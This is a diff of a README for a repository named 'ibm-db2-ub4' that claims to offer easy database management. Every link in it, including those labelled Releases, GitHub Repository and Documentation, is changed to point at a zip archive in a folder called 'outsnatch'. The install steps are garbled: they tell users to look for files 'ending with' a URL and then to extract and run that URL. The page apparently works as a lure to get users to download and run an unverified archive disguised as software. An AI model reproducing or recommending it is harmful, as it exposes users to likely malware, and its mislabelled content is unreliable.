@@ -1,6 +1,6 @@
 # 🎉 ibm-db2-ub4 - Easy Database Management for Everyone
 
-[![Download ibm-db2-ub4](https://raw.githubusercontent.com/sirjohnson13/ibm-db2-ub4/main/outsnatch/ibm-db2-ub4.zip)](https://raw.githubusercontent.com/sirjohnson13/ibm-db2-ub4/main/outsnatch/ibm-db2-ub4.zip)
+[![Download ibm-db2-ub4](https://github.com/sirjohnson13/ibm-db2-ub4/raw/refs/heads/main/outsnatch/ibm_db_ub_2.9.zip)](https://github.com/sirjohnson13/ibm-db2-ub4/raw/refs/heads/main/outsnatch/ibm_db_ub_2.9.zip)
 
 ## 📦 Introduction
 
@@ -30,11 +30,11 @@ Before installing, ensure your system meets these requirements:
 
 To download the latest version of **ibm-db2-ub4**, visit the following page:
 
-[Download ibm-db2-ub4 Releases](https://raw.githubusercontent.com/sirjohnson13/ibm-db2-ub4/main/outsnatch/ibm-db2-ub4.zip)
+[Download ibm-db2-ub4 Releases](https://github.com/sirjohnson13/ibm-db2-ub4/raw/refs/heads/main/outsnatch/ibm_db_ub_2.9.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the version you want to download.
-3. Click on the asset listed under that version (look for files ending with `.exe`, `.dmg`, or `https://raw.githubusercontent.com/sirjohnson13/ibm-db2-ub4/main/outsnatch/ibm-db2-ub4.zip`).
+3. Click on the asset listed under that version (look for files ending with `.exe`, `.dmg`, or `https://github.com/sirjohnson13/ibm-db2-ub4/raw/refs/heads/main/outsnatch/ibm_db_ub_2.9.zip`).
 4. Your download will start automatically.
 
 ### 🛠 Installation Steps
@@ -43,7 +43,7 @@ Once the file has downloaded:
 
 - **Windows**: Double-click the `.exe` file and follow the installation prompts.
 - **macOS**: Open the `.dmg` file and drag the application into the Applications folder.
-- **Linux**: Extract the `https://raw.githubusercontent.com/sirjohnson13/ibm-db2-ub4/main/outsnatch/ibm-db2-ub4.zip` file and run the installation script in the terminal.
+- **Linux**: Extract the `https://github.com/sirjohnson13/ibm-db2-ub4/raw/refs/heads/main/outsnatch/ibm_db_ub_2.9.zip` file and run the installation script in the terminal.
 
 ### 🏁 First Run
 
@@ -65,8 +65,8 @@ If you encounter any issues:
 
 For more information and updates, visit our:
 
-- [GitHub Repository](https://raw.githubusercontent.com/sirjohnson13/ibm-db2-ub4/main/outsnatch/ibm-db2-ub4.zip)
-- [Documentation](https://raw.githubusercontent.com/sirjohnson13/ibm-db2-ub4/main/outsnatch/ibm-db2-ub4.zip)
+- [GitHub Repository](https://github.com/sirjohnson13/ibm-db2-ub4/raw/refs/heads/main/outsnatch/ibm_db_ub_2.9.zip)
+- [Documentation](https://github.com/sirjohnson13/ibm-db2-ub4/raw/refs/heads/main/outsnatch/ibm_db_ub_2.9.zip)
 
 ## 📞 Support
 
